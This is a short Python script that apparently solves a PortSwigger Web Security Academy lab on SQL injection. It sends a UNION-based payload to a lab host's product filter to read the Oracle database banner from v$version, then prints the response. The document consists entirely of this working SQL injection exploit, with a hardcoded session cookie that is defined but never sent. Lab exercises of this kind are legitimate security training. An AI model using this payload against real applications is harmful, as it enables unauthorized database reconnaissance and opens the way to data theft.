# Lab: SQL injection attack, querying the database type and version on Oracle

import requests
import re 

url = "https://0ab70063032f4fbdc05e1a1a00c3001e.web-security-academy.net/"

PAYLOAD = "' UNION SELECT null,banner from v$version-- -"

params = dict(category=PAYLOAD)
cookies = dict(session="q5msfZFPg0tMYHa23t0FIqobvjXuQheF")

r = requests.get(url + 'filter', params=params)
print(r.text)
print(r.status_code)